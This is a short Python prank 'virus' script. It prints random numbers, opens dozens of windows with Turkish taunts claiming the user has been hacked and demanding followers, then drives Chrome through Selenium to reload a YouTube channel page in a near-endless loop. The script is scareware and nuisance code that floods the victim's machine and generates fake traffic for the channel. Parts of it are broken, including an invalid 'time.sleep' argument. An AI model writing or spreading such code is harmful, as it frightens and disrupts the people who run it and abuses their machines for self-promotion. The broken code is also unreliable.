import random
import time
import tkinter as tk
from selenium import webdriver

def Matrix():
    counter = 0
    for i in range(30):
        random_number = random.randint(1, 99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999)
        print(random_number)
        counter += 1
    if counter == 30:
        Virüs()
def Virüs():
    counter = 0
    for i in range(50):
        p1 = tk.Tk()
        e1 = tk.Label(p1, text='Hacklendin! hahahaha')
        p1.geometry("300x300")
        e1.pack()
        p2 = tk.Tk()
        e2 = tk.Label(p2, text='Hikmetullah Tarafından Haclendin')
        p2.geometry("300x300")
        p3 = tk.Tk()
        e3 = tk.Label(p3, text='Takipçi VER!')
        p3.geometry("300x300")
        e3.pack()
        p4 = tk.Tk()
        e4 = tk.Label(p4, text='ÇABUKKKKKKKK')
        e4.pack()
        p4.geometry("300x300")
    counter += 1
    driver_path = "/path/to/chromedriver"
    driver = webdriver.Chrome(executable_path=driver_path)
    counter = 0
    for i in range(999999999999999999999999999):
        driver.get("https://www.youtube.com/@HackerPython2")
        time.sleep(0.000.000.000.000.000.000.001)
        counter += 1
Matrix()